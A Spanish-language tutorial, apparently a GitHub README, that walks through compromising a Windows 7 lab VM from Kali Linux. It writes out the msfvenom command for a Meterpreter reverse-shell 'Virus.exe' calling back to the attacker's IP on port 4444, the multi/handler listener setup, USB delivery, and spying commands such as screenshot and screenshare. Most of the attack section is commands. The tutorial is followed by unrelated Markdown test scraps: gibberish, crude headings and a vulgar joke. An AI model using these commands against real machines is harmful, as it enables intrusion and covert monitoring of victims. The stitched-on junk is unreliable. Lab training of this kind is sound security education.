# 1. Introducción
En este documento vamos a vulnerar una maquina **Windows 7** haciendo uso de una maquina **Kali Linux** y el **MetaSploit Framework**. 

En esta guia se va a usar el **MetaSploit Framework** que en pocas palabras es una herramienta de código abierto utilizada para desarrollar, probar y ejecutar exploits contra sistemas informáticos.

## 1.1. Requisitos
Antes de comenzar con el proceso de vulneración de la máquina Windows 7, asegúrate de contar con los siguientes requisitos:

1. **Máquina Kali Linux:** Será necesario tener una máquina con el sistema operativo Kali Linux instalado. Puedes obtener Kali Linux desde el sitio web oficial: https://www.kali.org/downloads/.
2. **Máquina Windows 7:** Aparte de tener Kali Linux, también necesitarás una máquina Windows 7 instalado. Puedes utilizar una máquina física o una máquina virtual para este propósito.
4. **MetaSploit Framework:** Por último, necesitarás tener instalado y configurado el Metasploit Framework en tu máquina Kali Linux. Puedes encontrar instrucciones detalladas sobre cómo instalar Metasploit en el sitio web oficial: https://www.metasploit.com/download.


> [!WARNING]
> Por favor, ten en cuenta que esta practica se ha realizado en un **entorno controlado** con **fines educativos. No se ha implementado ni probado en entornos profesionales**. Se recomienda no realizar estas acciones en entornos sin autorización previa.

> [!NOTE]
> Utilizaremos **máquinas virtuales** para ejecutar Kali Linux y Windows 7, lo que nos permite realizar **pruebas de seguridad de manera segura y controlada** en un entorno aislado y reversible.

# 2. Creación del virus
Para empezar, en tu maquina **Linux** mira la **dirección IP** que tienes. Para ello puedes hacer uso del siguiente comando:

```bash
ip -c a
```
<p align="center"><img width="600" src="/images/Captura-IP.png"></p>

En mi caso la **dirección IP** de la maquina Linux es: **192.168.0.26**

Ahora, tendremos que crear un **Virus** con la extension `.exe` que es la extension que usa Windows para sus archivos ejecutables. Por lo tanto se usara el comando `msfvenom`. Este es el comando completo que tendras que usar:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.26 lport=4444 -f exe -a x86 > Virus.exe
```
<p align="center"><img width="600" src="/images/Captura-Virus.png"></p>

La opción `-p windows/meterpreter/reverse_tcp` especifica el **payload** que se utilizara con `msfvenom` para generar **payload malicioso**. Después `lhost=miIp` es donde especificamos la **dirección IP** de la **máquina atacante**, seguido por `lport=4444` que es donde definimos el puerto que va a utilizar el archivo para que la **máquina víctima se conecte a la máquina atacante**. A continuación especificamos el formato del archivo que se va a crear con la opción `-f` seguido por `exe`. Después, definimos la arquitectura que va a usar el archivo con la opción `-a` seguido por `x86`. Finalmente, con el sinbolo `>` damos nombre al archivo que se va a crear en este caso `Virus.exe`.

> [!IMPORTANT]
> Es muy importante que el archivo funcione por el puerto 4444. Este puerto se usa comúnmente para la comunicación entre la máquina atacante y la máquina víctima en muchas configuraciones de exploits y herramientas de hacking. Si no se especifica el puerto 4444 correctamente al generar el payload, es posible que la conexión entre las maquinas no se establezca correctamente.

# 3. Ejecución del Metasploit Framework
A continuación, describiremos el payload que hemos generado y explicaremos cómo puede ser utilizado para llevar a cabo un ataque exitoso.

## 3.1. Abririendo la consola de MetaSploit Framework
Con el comando `msfconsole` abriremos la consola de **MetaSploit Framework**.

```bash
msfconsole
```
<p align="center"><img width="600" src="/images/Captura-msfconsole.png"></p>

## 3.2 Configuracion del exploit y payload

Ahora que hemos abierto la consola, podremos ajustar el **exploit** y **payload** que vamos a usar para hacer esta practica. 

Por ello, empezaremos a ajustar el exploit con el siguiente comando:

```bash
use exploit/multi/handler
```
<p align="center"><img width="600" src="/images/Captura-Exploit.png"></p>

Después, definiremos el **payload** que vamos a usar. En este caso es el que hemos puesto anteriormente al crear el virus. Para ello se va a hacer uso del siguiente comando:

```bash
set payload windows/meterpreter/reverse_tcp
```
<p align="center"><img width="600" src="/images/Captura-Payload.png"></p>

Seguidamente, vamos a definir por la **direccion IP** y **puerto** que vamos a estar escuchando. Es decir, vamos a configurar por donde el atacante va a escuchar. Para ello definiremos el `lhost` y `lport`. Ten en cuenta que esto que vamos a configurar es para que el atacante pueda estar conectado a la aplicacion maliciosa que habiamos creado anteriormente, con lo cual, la ip tiene que ser de la maquina atacante. Para ello se hara uso de estos dos comandos:

```bash
set lhost 192.168.0.26 
```
```bash
set lport 4444 
```
<p align="center"><img width="600" src="/images/Captura-lhost-lport.png"></p>

Ya para terminar, lo unico que nos falta es ejecutar el comando `exploit`. Al ejecutar esto, la maquina atacante se quedaria en escucha **hasta que la maquina victima ejecute el virus**. Finalmente este es el ultimo comando que debes de ejecutar:

```bash
exploit
```
<p align="center"><img width="600" src="/images/Captura-EjecutarExploit.png"></p>

## 3.3 Trasladar el virus a la maquina victima
El siguiente paso sera transladar el virus de a la maquina victima y ejecutar el virus. Para hacer esto tenemos varias opciones, pero como estoy en un entorno controlado, lo transladare mediante un pendrive. 

<p align="center"><img width="600" src="/images/Captura-TransladoVirus.png"></p>

Una vez que hayamos entrado a la maquina victima podemos meter el pendrive y ejecutar el archivo. 

<p align="center"><img width="600" src="/images/Captura-Windwos7Pendrive.png"></p>

El archivo no va a hacer nada al ejecutar, simplemente va a conectarse a la maquina atacante y en la maquina atacante podremos ver como se nos ha establecido la conexion a la maquiba victima. 

Al ejecutarlo se podra ver como establece la conexion con la maquina victima existosamente.

<p align="center"><img width="600" src="/images/ConexionMaquinaVictima.png"></p>

# 4. Realizar acciones en la maquina victima

Con la conexión establecida entre la máquina atacante y la máquina víctima, podemos comenzar a interactuar con el sistema comprometido. A continuación, te mostrare como utilizar algunos comandos basicos de **Metasploit** para obtener información y realizar acciones en la máquina víctima.

## 4.1 Obtener informacion del sistema

Un comando comun usado para tener informacion del sistema como el sistema operativo, la arquitectura y el nombre del sistema es `sysinfo`. 

```bash
sysinfo
```

<p align="center"><img width="600" src="/images/Captura-Sysinfo.png"></p>

## 4.2 Hacer captura de pantalla 

El comando `screenshot` nos permite **tomar una captura de pantalla** de la máquina víctima. Esto puede ser útil para ver qué está haciendo el usuario en ese momento. 

```bash
screenshot
```

<p align="center"><img width="600" src="/images/Captura-Screenshot.png"></p>

## 4.3 Compartir 

El comando `screenshare` permite ver la pantalla de la máquina víctima en tiempo real. Esto es especialmente útil para **monitorear actividades en curso**. Para iniciar la compartición de pantalla, escribe:

```bash
screenshare
```

<p align="center"><img width="600" src="/images/Captura-Screenshare.png"></p>

<p align="center"><img width="600" src="/images/Captura-Screenshare-Web.png"></p>




Esto es una prueba normal

- Pepe
- Pepe

[Enlace](https://www.ejemplo.com)

![Imagen](ruta/a/imagen.jpg)

# Pene
asdaksjhdlkjashdljkhasd
## Pene
akljsdhklajhsdlkjhad
### Pene
aksjhdlkñajsnd aslkjdhbalskj dkbjasd 
**This is bold text**
__This is bold text__
_Cursiva_
*Cursiva*


Esto es un ejemplo muy guay

> Texto no entiendo

Imagina que este es el codigo `print("")` de python.
The background color is `#ffffff` for light mode and `#000000` for dark mode.

Esto es el codigo:
```python
print("Tu madre esta gorda")
```
```bash
$ ls -l
total 16
-rw-r--r-- 1 user user 1985 May 2 10:00 Documentación.md
drwxr-xr-x 2 user user 4096 May 1 09:21 imágenes
```
Esto es el final

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/25423296/163456776-7f95b81a-f1ed-45f7-b7ab-8fa810d529fa.png">
  <source media="(prefers-color-scheme: light)" srcset="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
  <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
</picture>





